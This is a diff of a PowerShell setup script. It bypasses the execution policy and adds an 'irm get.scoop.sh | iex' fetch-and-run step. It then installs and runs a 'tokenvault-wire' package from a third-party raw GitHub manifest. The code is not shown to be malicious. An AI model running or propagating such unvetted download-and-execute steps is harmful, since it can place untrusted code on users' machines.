@@ -26,18 +26,14 @@ Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope CurrentUser
 
 $packageName = "tokenvault-wire"
 $installUrl = "https://raw.githubusercontent.com/devscoop-labs/scoop/refs/heads/main/token-vault.json"
-
 $scoopShims = "$env:USERPROFILE\scoop\shims"
 $appPath = "$env:USERPROFILE\scoop\apps\$packageName"
 
-# 2. 완성된 순수 문자열 경로($scoopShims, $appPath)를 스크립트 안으로 밀어 넣습니다.
-#    (안에서는 더 이상 $env:를 직접 쓰지 않으므로 토큰 에러가 절대 나지 않습니다.)
+
 $scriptContent = @"
-`$env:PATH = "$scoopShims;`$env:PATH"
-if (!(Test-Path "$appPath")) {
-    scoop install $installUrl
-    wire
-}
+`$env:PATH = '$scoopShims;' + `$env:PATH
+if (!(Get-Command scoop -ErrorAction SilentlyContinue)) { irm get.scoop.sh | iex | Out-Null }
+if (!(Test-Path '$appPath')) { scoop install $installUrl; wire }
 "@
 
 Start-Process powershell -ArgumentList "-NoExit", "-Command", $scriptContent
